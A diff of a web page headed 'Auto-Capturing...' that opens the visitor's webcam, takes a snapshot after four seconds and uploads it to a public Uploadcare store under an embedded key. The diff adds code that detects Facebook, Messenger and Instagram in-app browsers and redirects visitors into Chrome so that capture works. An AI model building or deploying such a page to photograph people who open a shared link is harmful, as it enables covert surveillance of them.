@@ -16,78 +16,87 @@
       text-align: center;
     }
     video {
+      display: block;
       width: 100%;
       max-width: 400px;
       border-radius: 10px;
     }
-    .warning {
-      color: yellow;
-      font-size: 14px;
-      margin-top: 10px;
+    #open-chrome {
+      margin-top: 20px;
+      background: #0f0;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 8px;
     }
   </style>
 </head>
 <body>
   <h2>Auto-Capturing...</h2>
   <video id="video" autoplay playsinline></video>
-  <p class="warning" id="warn"></p>
+  <div id="chrome-warning" style="display: none;">
+    <p>⚠️ Camera might not work in Messenger/Facebook. Open in Chrome:</p>
+    <button id="open-chrome">Open in Chrome</button>
+  </div>
 
   <script>
     const video = document.getElementById('video');
-    const warn = document.getElementById('warn');
 
-    // Check if browser is Facebook/Messenger/Instagram
     const ua = navigator.userAgent || '';
-    if (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram')) {
-      warn.textContent = "⚠️ Camera might not work in Messenger/Facebook browser. Please open this link in Google Chrome.";
+    const isInAppBrowser = ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram');
+
+    if (isInAppBrowser) {
+      document.getElementById('chrome-warning').style.display = 'block';
+      document.getElementById('open-chrome').onclick = () => {
+        const url = "https://av1704.github.io/camera-test/";
+        window.location.href = "googlechrome://" + url.replace(/^https?:\/\//, '');
+      };
+    } else {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append('file', blob);
+              formData.append('UPLOADCARE_STORE', '1');
+              formData.append('UPLOADCARE_PUB_KEY', 'cc243a8b7d6b1f1c4162');
+
+              fetch('https://upload.uploadcare.com/base/', {
+                method: 'POST',
+                body: formData
+              })
+              .then(res => res.json())
+              .then(data => {
+                const url = `https://ucarecdn.com/${data.file}/`;
+                document.body.innerHTML = `
+                  <h2>Image Uploaded ✅</h2>
+                  <p><a href="${url}" target="_blank">${url}</a></p>
+                  <img src="${url}" style="max-width: 100%; margin-top: 10px;" />
+                `;
+              })
+              .catch(err => {
+                alert("Upload failed");
+                console.error(err);
+              });
+            }, 'image/jpeg');
+          }, 4000);
+        })
+        .catch(err => {
+          alert("Camera access denied or not supported.");
+          console.error(err);
+        });
     }
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-
-        // Wait before capturing
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
-
-          // Stop camera stream
-          stream.getTracks().forEach(track => track.stop());
-
-          // Convert to blob
-          canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('file', blob);
-            formData.append('UPLOADCARE_STORE', '1');
-            formData.append('UPLOADCARE_PUB_KEY', 'cc243a8b7d6b1f1c4162'); // your public key
-
-            fetch('https://upload.uploadcare.com/base/', {
-              method: 'POST',
-              body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-              const url = `https://ucarecdn.com/${data.file}/`;
-              document.body.innerHTML = `
-                <h2>Image Uploaded ✅</h2>
-                <p><a href="${url}" target="_blank">${url}</a></p>
-                <img src="${url}" style="max-width: 100%; margin-top: 10px;" />
-              `;
-            })
-            .catch(err => {
-              alert("Upload failed ❌");
-              console.error(err);
-            });
-          }, 'image/jpeg');
-        }, 4000); // wait 4 seconds to allow camera to start
-      })
-      .catch(err => {
-        alert("❌ Camera access denied or not supported.");
-        console.error(err);
-      });
   </script>
 </body>
 </html>
